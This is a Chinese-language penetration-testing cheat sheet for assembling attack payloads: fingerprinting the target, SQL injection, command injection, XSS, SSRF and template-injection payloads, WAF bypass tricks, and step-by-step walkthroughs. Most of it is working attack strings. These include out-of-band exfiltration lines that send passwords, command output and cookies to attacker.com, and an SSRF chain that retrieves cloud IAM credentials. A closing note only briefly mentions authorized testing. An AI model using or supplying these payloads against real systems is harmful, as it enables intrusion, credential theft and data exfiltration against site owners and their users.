# Payload 组装指南

## 概述

Payload 组装是漏洞验证的核心环节，需要根据目标环境特点构造针对性的攻击载荷。本指南提供系统化的组装方法论。

## 组装流程

```
1. 环境识别 → 确定目标技术栈
2. 漏洞定位 → 确认漏洞类型和注入点
3. 基础 Payload → 选择基础模板
4. 环境适配 → 根据目标环境调整
5. 绕过检测 → 绕过 WAF/过滤器
6. 验证利用 → 确认漏洞存在并利用
```

## 1. 环境识别

### 技术栈识别

```
# HTTP 响应头
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
X-AspNet-Version: 4.0.30319

# 错误页面
- Java: ServletException, NullPointerException
- PHP: Fatal error, Parse error
- Python: Traceback, ImportError
- .NET: System.Exception, HttpException

# URL 特征
- .php, .jsp, .aspx, .py, .rb
- /api/, /graphql, /rest/

# Cookie 特征
- JSESSIONID → Java
- PHPSESSID → PHP
- ASP.NET_SessionId → .NET
```

### 数据库识别

```sql
# 报错信息识别
MySQL: You have an error in your SQL syntax
PostgreSQL: ERROR: syntax error at or near
MSSQL: Microsoft OLE DB Provider
Oracle: ORA-00933: SQL command not properly ended

# 盲注识别
MySQL: SLEEP(5), BENCHMARK()
PostgreSQL: pg_sleep(5)
MSSQL: WAITFOR DELAY '0:0:5'
Oracle: DBMS_LOCK.SLEEP(5)
```

### WAF 识别

```
# 响应头识别
Server: cloudflare
X-Sucuri-ID: xxxxx
X-Akamai-Transformed: xxx

# 错误响应特征
- 403 Forbidden + 特定错误页面
- 406 Not Acceptable
- 自定义拦截页面

# 行为特征
- 关键词替换为空
- 返回相同响应但不执行
- 连接重置/超时
```

## 2. 漏洞定位

### 注入点确认

```
# 参数位置
- URL 参数 ?id=1
- POST 参数 {"id": 1}
- HTTP Header User-Agent, Referer, Cookie
- JSON 字段 {"user": {"id": 1}}
- XML 标签 <id>1</id>

# 参数类型
- String: 'test'
- Integer: 123
- JSON: {"key": "value"}
- Base64: dGVzdA==
```

### 输出点确认

```
# 回显位置
- 响应体中直接输出
- 错误信息中输出
- Set-Cookie 中
- 重定向 URL 中
- 延时响应
- DNS 外带
- HTTP 外带
```

## 3. 基础 Payload 选择

### SQL 注入

```
# 按数据库选择
MySQL: ' OR 1=1--
PostgreSQL: ' OR 1=1--
MSSQL: ' OR 1=1--
Oracle: ' OR 1=1--

# 按注入类型选择
联合注入: ' UNION SELECT 1,2,3--
报错注入: ' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
盲注: ' AND SLEEP(5)--
```

### 命令注入

```
# 按操作系统选择
Linux: ; id, | id, `id`, $(id)
Windows: | whoami, & whoami, && whoami

# 按语言选择
PHP: ; system('id')
Python: ; os.system('id')
Node.js: ; require('child_process').exec('id')
```

### XSS

```
# 按上下文选择
HTML: <script>alert(1)</script>
属性: " onmouseover=alert(1) x="
JS: '-alert(1)-'
URL: javascript:alert(1)
```

### SSRF

```
# 按协议选择
HTTP: http://127.0.0.1
File: file:///etc/passwd
Gopher: gopher://127.0.0.1:6379/_
Dict: dict://127.0.0.1:6379/info
```

## 4. 环境适配

### 字符集适配

```
# 编码检测
1. 发送特殊字符，观察是否被正确处理
2. 测试 UTF-8, GBK, Latin1 等编码
3. 测试宽字节注入

# 示例
GBK: %df%27 (宽字节)
UTF-8: %e5%5c%27
```

### 过滤规则适配

```
# 测试过滤规则
1. 发送关键词，观察响应
2. 发送编码后的关键词
3. 发送替代关键词

# 示例
过滤空格: 使用 /**/ 或 %09
过滤引号: 使用 \x27 或 char()
过滤关键词: 使用大小写混合或编码
```

### 框架适配

```
# 框架特定 Payload
# Spring
${T(java.lang.Runtime).getRuntime().exec('id')}

# Flask/Jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Express/Handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{true}}
  {{/with}}
{{/with}}
```

## 5. 绕过检测

### 编码绕过

```
# URL 编码
%27 → '

# 双重编码
%2527 → %27 → '

# HTML 实体
&#39; → '

# Unicode
\u0027 → '

# Base64
Jw== → '
```

### 结构绕过

```
# SQL 注释
'/**/OR/**/1=1--

# 大小写混合
SeLeCt * FrOm users

# 拼接
SEL||ECT

# 嵌套
SELSELECTECT
```

### 替代绕过

```
# 函数替代
substr() → mid(), left(), right()
concat() → ||, concat_ws()

# 操作符替代
= → LIKE, IN, REGEXP
AND → &&, OR → ||
```

## 6. 验证利用

### 带外验证

```
# DNS 外带
SQL: LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a'))
CMD: nslookup $(whoami).attacker.com
XSS: fetch('http://attacker.com/?c='+document.cookie)

# HTTP 外带
SQL: UTL_HTTP.REQUEST('http://attacker.com/?d='||data)
CMD: curl http://attacker.com/?d=$(id|base64)
```

### 时间验证

```
# 延时检测
SQL: SLEEP(5), pg_sleep(5), WAITFOR DELAY '0:0:5'
CMD: sleep 5
XSS: setTimeout('alert(1)',5000)
```

### 回显验证

```
# 直接回显
SQL: UNION SELECT username,password FROM users
CMD: cat /etc/passwd
XSS: alert(document.cookie)
```

## Payload 组装示例

### SQL 注入完整流程

```
1. 识别注入点
   ?id=1

2. 测试注入类型
   ?id=1' → 报错，说明是字符型

3. 确定数据库
   ?id=1' AND 1=CONVERT(INT,@@version)--
   → Microsoft SQL Server

4. 选择基础 Payload
   ?id=1' UNION SELECT 1,2,3--

5. 绕过 WAF
   ?id=1'/**/UNION/**/SELECT/**/1,2,3--

6. 提取数据
   ?id=1'/**/UNION/**/SELECT/**/table_name,NULL,NULL/**/FROM/**/information_schema.tables--
```

### XSS 完整流程

```
1. 识别注入点
   <input value="SEARCH_TERM">

2. 测试基础 Payload
   "><script>alert(1)</script>
   → 被过滤

3. 尝试编码绕过
   ">&#60;script&#62;alert(1)&#60;/script&#62;
   → 被过滤

4. 尝试替代标签
   "><img src=x onerror=alert(1)>
   → 成功

5. 优化利用
   "><img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>
```

### SSRF 完整流程

```
1. 识别参数
   ?url=http://example.com

2. 测试内网访问
   ?url=http://127.0.0.1
   → 被拦截

3. 尝试 IP 变换
   ?url=http://2130706433
   → 成功

4. 访问云元数据
   ?url=http://169.254.169.254/latest/meta-data/
   → 返回 AWS 元数据

5. 获取敏感信息
   ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

## 注意事项

### 安全边界

```
1. 仅在授权范围内测试
2. 避免对生产环境造成影响
3. 使用带外通道验证，减少对目标的直接交互
4. 及时清理测试数据
```

### 效率优化

```
1. 使用自动化工具辅助
2. 批量测试常用 Payload
3. 记录成功的 Payload 模式
4. 建立自己的 Payload 库
```

### 文档记录

```
1. 记录每一步测试结果
2. 记录成功的 Payload
3. 记录绕过方法
4. 记录利用过程和结果
```